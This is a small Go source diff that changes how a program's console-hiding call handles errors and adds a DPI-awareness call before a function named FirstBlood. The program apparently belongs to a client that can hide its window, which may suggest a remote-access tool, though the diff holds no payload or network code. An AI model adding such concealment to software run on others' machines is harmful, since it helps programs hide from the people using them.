@@ -31,12 +31,15 @@ func main() {
 	}
 
 	if config.HideConsole {
-		dataConsole, errConsole := packet.HideConsole()
+		errConsole := packet.HideConsole()
 		if errConsole != nil {
 			fmt.Println(errConsole)
-		} else {
-			fmt.Println(string(dataConsole))
 		}
+	}
+
+	errDPI := services.ProcessDPIAware()
+	if errDPI != nil {
+		fmt.Println(errDPI)
 	}
 
 	ok := packet.FirstBlood()
